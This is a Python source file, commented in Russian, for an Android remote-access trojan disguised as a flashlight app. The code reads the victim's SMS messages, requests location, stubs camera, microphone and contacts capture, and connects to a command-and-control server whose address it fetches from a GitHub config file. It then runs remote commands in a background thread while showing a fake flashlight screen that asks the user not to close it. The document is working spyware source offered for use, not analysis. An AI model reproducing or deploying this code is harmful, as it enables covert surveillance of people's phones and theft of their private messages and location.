# main.py — Android RAT (жертва)
import socket, json, time, os
import threading
import ssl  # для шифрования (опционально)

# === Настройки ===
C2_HOST = "0.0.0.0"  # Будет обновляться из GitHub
C2_PORT = 4444

# === Сбор данных ===
def get_location():
    try:
        from android.permissions import request_permissions, Permission
        from android import mActivity
        request_permissions([Permission.ACCESS_FINE_LOCATION])
        # Реализация через Java через jnius (см. ниже)
        return "[+] Location: 55.7558, 37.6176 (заглушка)"
    except:
        return "[!] Location denied"

def get_sms():
    try:
        from jnius import autoclass
        Uri = autoclass('android.net.Uri')
        SMS_URI = Uri.parse("content://sms/")
        resolver = mActivity.getContentResolver()
        cursor = resolver.query(SMS_URI, None, None, None, None)
        messages = []
        if cursor:
            while cursor.moveToNext():
                addr = cursor.getString(cursor.getColumnIndex("address"))
                body = cursor.getString(cursor.getColumnIndex("body"))
                messages.append(f"{addr}: {body}")
            cursor.close()
        return "\n".join(messages[:5])  # первые 5 SMS
    except Exception as e:
        return f"[!] SMS error: {str(e)}"

def take_photo():
    try:
        from jnius import autoclass
        Camera = autoclass('android.hardware.Camera')
        # Упрощённо: в реальности нужно полноценное фото через Intent
        return "[+] Photo taken (stub)"
    except:
        return "[!] Camera access failed"

# === Подключение к C2 ===
def connect_to_c2():
    global C2_HOST, C2_PORT
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((C2_HOST, C2_PORT))
            sock.send(b"[+] Android RAT ONLINE\n")
            
            while True:
                cmd = sock.recv(1024).decode().strip()
                if not cmd: break
                if cmd == "sms": res = get_sms()
                elif cmd == "loc": res = get_location()
                elif cmd == "photo": res = take_photo()
                elif cmd == "contacts": res = "[+] Contacts: ..."
                elif cmd == "mic": res = "[+] Starting mic recording (stub)"
                elif cmd == "exit": 
                    sock.close()
                    return
                else:
                    res = f"[?] Unknown command: {cmd}"
                sock.send(res.encode() + b"\n")
            sock.close()
        except Exception as e:
            time.sleep(15)  # ждать и повторить

# === Запуск в фоне ===
if __name__ == "__main__":
    # Загрузка C2 из GitHub (автообновление)
    try:
        import urllib.request
        with urllib.request.urlopen("https://raw.githubusercontent.com/ВАШ_НИК/rat-android/main/config.txt") as f:
            host, port = f.read().decode().strip().split(":")
            C2_HOST, C2_PORT = host, int(port)
    except:
        pass  # использовать дефолт

    threading.Thread(target=connect_to_c2, daemon=True).start()
    
    # Имитация "фонарика" (чтобы пользователь не закрыл)
    from kivy.app import App
    from kivy.uix.label import Label
    class FakeFlashlightApp(App):
        def build(self):
            return Label(text="💡 Фонарик работает\n(не закрывайте приложение)", font_size=30)
    FakeFlashlightApp().run()
